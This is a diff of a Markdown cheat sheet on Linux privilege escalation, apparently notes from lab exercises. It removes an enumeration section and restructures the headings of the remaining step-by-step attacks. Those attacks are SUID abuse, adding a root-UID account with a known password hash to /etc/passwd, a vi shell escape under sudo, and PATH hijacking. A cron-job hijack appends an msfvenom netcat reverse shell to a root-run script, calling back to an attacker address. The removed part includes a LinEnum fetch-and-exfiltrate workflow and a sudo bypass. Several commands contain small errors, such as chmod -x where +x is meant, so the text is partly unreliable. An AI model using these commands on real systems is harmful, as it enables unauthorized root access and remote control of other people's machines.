@@ -4,19 +4,33 @@
 
 - [Table of Contents](#table-of-contents)
 - [Initial checklist](#initial-checklist)
-- [Enumeration](#enumeration)
-  - [Query the System](#query-the-system)
-  - [LinEnum.sh to Exfiltrate comprehensive system information](#linenumsh-to-exfiltrate-comprehensive-system-information)
-  - [Use FIND to identify useful file properties and attributes](#use-find-to-identify-useful-file-properties-and-attributes)
-  - [Identify exploitable commands](#identify-exploitable-commands)
-  - [Identify Network Activity](#identify-network-activity)
-  - [Identify exploitable processes](#identify-exploitable-processes)
-- [Authentication Bypass Techniques](#authentication-bypass-techniques)
-  - [SUID/GUID](#suidguid)
-  - [Writeable /etc/passwd files](#writeable-etcpasswd-files)
-  - [Escaping the Vi editor](#escaping-the-vi-editor)
-  - [Exploit Crontab](#exploit-crontab)
-  - [Exploiting the PATH variable](#exploiting-the-path-variable)
+- [SUID/GUID](#suidguid)
+  - [Find the exploitable binary(ies)](#find-the-exploitable-binaryies)
+  - [Select options and validate permissions](#select-options-and-validate-permissions)
+  - [Run the target binary](#run-the-target-binary)
+- [Writeable /etc/passwd files](#writeable-etcpasswd-files)
+  - [Entry format](#entry-format)
+  - [Identify a potential user to exploit](#identify-a-potential-user-to-exploit)
+  - [Generate compliant password hash](#generate-compliant-password-hash)
+  - [Identify shell options](#identify-shell-options)
+  - [Generate the new passwd file entry for a user that will be root](#generate-the-new-passwd-file-entry-for-a-user-that-will-be-root)
+  - [Append the entry to /etc/passwd](#append-the-entry-to-etcpasswd)
+  - [Switch user](#switch-user)
+- [Escaping the Vi editor](#escaping-the-vi-editor)
+  - [Identify vulnerable binaries](#identify-vulnerable-binaries)
+  - [Start the vulnerable binary](#start-the-vulnerable-binary)
+  - [Use Vi command mode to open a shell with root privileges](#use-vi-command-mode-to-open-a-shell-with-root-privileges)
+- [Exploit Crontab](#exploit-crontab)
+  - [Identify cronjobs running with elevated privileges](#identify-cronjobs-running-with-elevated-privileges)
+  - [Use Metasploit to generate a reverse shell and place into the autoscript.sh](#use-metasploit-to-generate-a-reverse-shell-and-place-into-the-autoscriptsh)
+  - [Append the exploit to the autoscript.sh file](#append-the-exploit-to-the-autoscriptsh-file)
+  - [Start a netcat listener on the Attacking device](#start-a-netcat-listener-on-the-attacking-device)
+  - [Wait for the connection](#wait-for-the-connection)
+- [Exploiting the PATH variable](#exploiting-the-path-variable)
+  - [Show the current user's PATH](#show-the-current-users-path)
+  - [Build an imitation binary](#build-an-imitation-binary)
+  - [Alter the PATH variable](#alter-the-path-variable)
+  - [Run the script file](#run-the-script-file)
 - [Other References](#other-references)
 
 
@@ -28,149 +42,22 @@
 4. Credentials (user accounts, application config files..)
 5. Mis-configured file and directory permissions  
 
-## Enumeration
 
-### Query the System
+## SUID/GUID  
 
-`:> hostname` : Query the hostname  
-
-`:> uname -a`  : Query Kernel information  
-
-`:> cat /etc/passwd`  :  Identify system users  
-
-`:> cat /etc/shells` : Identify potentially useful shells on the system
-
-`:> cat /etc/crontab` : List cron jobs
-
-`:> cat /proc/version` : Specifics about the kern verion and the GCC compilers use to build the kernel  
-
-`:> cat /etc/issue` : Contains the pre-login prompt and can be changed  
-
-`:> env` : Display environment variables  
-
-`:> id` : overview of user's privileges; providing another username as an argument can reveal priviileges of that user
-
-`:> history` : information about the target system and limited information on potentially captured usernames and passwords
-
-### LinEnum.sh to Exfiltrate comprehensive system information
-
-Get LinEnum.sh onto the attacking device
-
-`:> wget -O LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh`
-
-Gain access to the target machine
-
-![Logged In](assets/Linux-PrivEsc-01-LinEnum-01.png)
-
-Open a simple server on the attacking device in the directory from where LinEnum can be transported.
-
-`:> python3 -m http.server 8888`
-
-![Python Server](assets/Linux-PrivEsc-01-LinEnum-02.png)  
-
-On the target device, set up a location from where the script will run.  
-
-![Target Locationls](assets/Linux-PrivEsc-01-LinEnum-03.png)  
-
-Pull the script from the python server to the target device.  
-
-`:> wget 10.201.47.243:8888/LinEnum.sh`
-
-The serving attacker logs the "GET" request and the target device recevies the script
-
-![wget LinEnum](assets/Linux-PrivEsc-01-LinEnum-04a.png)  
-
-If the target device is permitted a WAN connection, pull the script from GitHub.
-
-`:> wget -O LinEnumFromGit.sh https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh`  
-
-Add execution privileges to the script 
-
-`:> chmod +x LinEnum.py`
-
-![with exeuction](assets/Linux-PrivEsc-01-LinEnum-05.png)  
-
-Run the script and output to a file that can be studied for escalation opportunities
-
-`:> ./LinEnum.sh > enum.txt`
-
-Shutdown the server on the attacking device
-
-![Server Shutdown](assets/Linux-PrivEsc-01-LinEnum-06.png)  
-
-Reverse the server setup and transfer the enum.txt to the attacking device for analysis and resource development.
-
-![Data Exfiltration](assets/Linux-PrivEsc-01-LinEnum-07.png)
-
-### Use FIND to identify useful file properties and attributes  
-
-`:> find . -name "*string*` : find all files in the current directory whose name contains 'string'  
-`:> find . -name flag1.txt` : find the files in the current directory with the name "flag1.txt”  
-`:> find /home -name flag1.txt` : find the files in the /home directory with the name “flag1.txt”  
-`:> find / -type d -name config` : recursively search from the root directory to find the directory named config  
-`:> find / -type f -perm 777` : recursively search from the root directory and list files readable, writable, and executable by all users  
-`:> find / -perm a=x` : recursively search from the root directory and list all executable files  
-`:> find /home -user frank` : recursively search from the /home directory and list all files for user “frank”  
-`:> find / -mtime 10` : recursively search from the root directory and list all files modified in the last 10 days  
-`:> find / -atime 10` : recursively search from the root directory and list all files accessed in the last 10 days  
-`:> find / -cmin -60` : recursively search from the root directory and list all files changed within the last hour (60 minutes)  
-`:> find / -amin -60` : recursively search from the root directory and list all files accessed within the last hour  
-`:> find / -size 50M` : recursively search from the root directory and list all files 50 MB in size  
-`:> find / =writable -type d 2>/dev/null` : recursively search from the root directory and list all world-writeable directories  
-`:> find / -perm -222 -type d 2>/dev/null` : recursively search from the root directory and list all world-writeable directories  
-`:> find / -perm -o w -type d 2>/dev/null` : recursively search from the root directory and list all world-writeable directories  
-`:> find / -perm -o x -type d 2>/dev/null` : recursively search from the root directory and list all world-executable directories  
-`:> find / -name perl* OR python* OR gcc*` : recursively search from the root directory and list development tools / supported languages  
-`:> find / -perm -u=s -type f 2>/dev/null` : recursively search from the root directory and list all files where special privileges are set for everyone.  
-`:> find / -perm /1000` : recursively search from the root directory and list objects with the sticky bit set  
-`:> find / -perm /2000` : recursively search from the root directory and list objects with the SGID bit set  
-`:> find / -perm /4000` : recursively search from the root directory and list objects with the SUID bit set  
-  
-### Identify exploitable commands
-
-`:> sudo -l` : list commands on which the current user may use sudo  
-`:> sudo -u#<user id> <command>` : execute a command using the profile of the given `<user id>`, which might be in the sudoers file  
-`:> sudo -u#-1 <command>` : sudo security bypass (CVE-2019-14287) with potentially available commands
-`:> sudo visudo` : edit the sudoers file
-
-### Identify Network Activity  
-
-`:> ifconfig` : network interfaces on the system; useful for pivoting
-`:> ip route` : which network routes exist
-`:> netstat` : list existing communications  
-`:> netstat -a` : show all listening ports and established connections  
-`:> netstat -at` or `-au` : lists TCP or UDP protocols  
-`:> netstat -l` : lists "listening" ports open to incoming communciations  
-`:> netstat -lt` : lists listening TCP ports  
-`:> netstat -s` : lists useage statics by protocol can be also used with "-t" or "-u"  
-`:> netstat -tp` : connections with the service name and PID information; add "l" to get listening ports  
-`:> netstat -i` : interface statistics  
-`:> netstat -ano` : "a" display all sockets; 'n' do not resolve names; "o" display timers  
-
-### Identify exploitable processes  
-
-`:> ps` : view running processes for current shell
-`:> ps -A` : view all running processes
-`:> ps axjf` : view process tree
-`:> ps aux` : processes for all users (a); user launched processes (u); not attached to a terminal (x)
-
-## Authentication Bypass Techniques
-
-### SUID/GUID  
-
-#### Find the exploitable binary(ies)  
+### Find the exploitable binary(ies)  
 
 `find / -perm -u=s -type f 2>/dev/null`
 
 ![Special Permissions Search](assets/Linux-PrivEsc-05-specials-01.png)
 
-#### Select options and validate permissions
+### Select options and validate permissions
 
 `:> ls -alh /home/user3/shell`
 
 ![validate permissions](assets/Linux-PrivEsc-05-specials-02.png)
 
-#### Run the target binary
+### Run the target binary
 
 `:> ./shell`
 
@@ -178,13 +65,15 @@ Results in a root prompt
 
 ![Run the Shell](assets/Linux-PrivEsc-05-specials-03.png)
 
-### Writeable /etc/passwd files  
+## Writeable /etc/passwd files  
 
-#### Entry format  
+[Editing /etc/passwd for Privilege Escalation](hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation)  
+
+### Entry format  
 
 [username] : [password] : [userID] : [groupID] : [Info] : [home-directory] : [path-to-shell]
 
-#### Identify a potential user to exploit
+### Identify a potential user to exploit
 
 `:> cat /etc/passwd`
 
@@ -196,53 +85,53 @@ Switch to user7
 
 ![Run the Shell](assets/Linux-PrivEsc-06-passwd-01.png)
 
-#### Generate compliant password hash
+### Generate compliant password hash
 
 `:> openssl passwd -1 -salt new 123`  
 
 ![Generate hash](assets/Linux-PrivEsc-06-passwd-02.png)  
 
-#### Identify shell options  
+### Identify shell options  
 
 `:> cat /etc/shells`  
 
 ![Generate hash](assets/Linux-PrivEsc-06-passwd-03.png)  
 
-#### Generate the new passwd file entry for a user that will be root
+### Generate the new passwd file entry for a user that will be root
 
 `new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash`
 
-#### Append the entry to /etc/passwd
+### Append the entry to /etc/passwd
 
 `:> echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd`
 
-#### Switch user
+### Switch user
 
 `:> su new` and enter the password  
 
 ![Complete](assets/Linux-PrivEsc-06-passwd-04.png)  
 
-### Escaping the Vi editor  
+## Escaping the Vi editor  
 
-#### Identify vulnerable binaries
+### Identify vulnerable binaries
 
 `:> sudo -l`
 
 ![exploitable bin](assets/Linux-PrivEsc-07-bins-01.png)
 
-#### Start the vulnerable binary
+### Start the vulnerable binary
 
 `:> sudo vi`
 
-#### Use Vi command mode to open a shell with root privileges  
+### Use Vi command mode to open a shell with root privileges  
 
 `:> !sh`
 
 ![exploited](assets/Linux-PrivEsc-07-bins-02.png)  
 
-### Exploit Crontab  
+## Exploit Crontab  
 
-#### Identify cronjobs running with elevated privileges
+### Identify cronjobs running with elevated privileges
 
 `:> cat /etc/crontab`  
 
@@ -258,33 +147,33 @@ Open the file
 
 ![open autoscript](assets/Linux-PrivEsc-08-cron-03.png)
 
-#### Use Metasploit to generate a reverse shell and place into the autoscript.sh  
+### Use Metasploit to generate a reverse shell and place into the autoscript.sh  
 
 `:> msfvenom -p cmd/unix/reverse_netcat lhost=<attacker IP> lport=8888 R`  
 
-mkfifo /tmp/yphto; nc 10.201.16.214 8888 0</tmp/yphto | /bin/sh >/tmp/yphto 2>&1; rm /tmp/  
+`mkfifo /tmp/yphto; nc 10.201.16.214 8888 0</tmp/yphto | /bin/sh >/tmp/yphto 2>&1; rm /tmp/`  
 
-#### Append the exploit to the autoscript.sh file
+### Append the exploit to the autoscript.sh file
 
 `:> echo 'mkfifo /tmp/yphto; nc 10.201.16.214 8888 0</tmp/yphto | /bin/sh >/tmp/yphto 2>&1; rm /tmp/' >> /home/user4/Desktop/autoscript.sh`   
 
-#### Start a netcat listener on the Attacking device  
+### Start a netcat listener on the Attacking device  
 
 `:> nc -lvnp 8888`
 
-#### Wait for the connection
+### Wait for the connection
 
 ![shell received](assets/Linux-PrivEsc-08-cron-05.png)  
 
-### Exploiting the PATH variable
+## Exploiting the PATH variable
 
-#### Show the current user's PATH  
+### Show the current user's PATH  
 
 `:> echo $PATH`
 
 ![Echo Path](assets/Linux-PrivEsc-09-path-01.png)  
 
-#### Build an imitation binary  
+### Build an imitation binary  
 
 `:> echo '/bin/bash' > /tmp/ls`  
 `:> chmod -x /tmp/ls`  
@@ -293,7 +182,7 @@ When this binary is called, it will open a bash shell, not list the files in the
 
 ![Echo Path](assets/Linux-PrivEsc-09-path-02.png)  
 
-#### Alter the PATH variable  
+### Alter the PATH variable  
 
 `:> export PATH=/tmp:$PATH`  
 
@@ -303,7 +192,7 @@ When a users calls "ls" the system will see the "ls" in the tmp folder and execu
 
 ![tmp on Path](assets/Linux-PrivEsc-09-path-03.png)  
 
-#### Run the script file  
+### Run the script file  
 
 Observe the script binary has the SUID set. Any command called by the script runs with the owner's (root) privileges.  
 
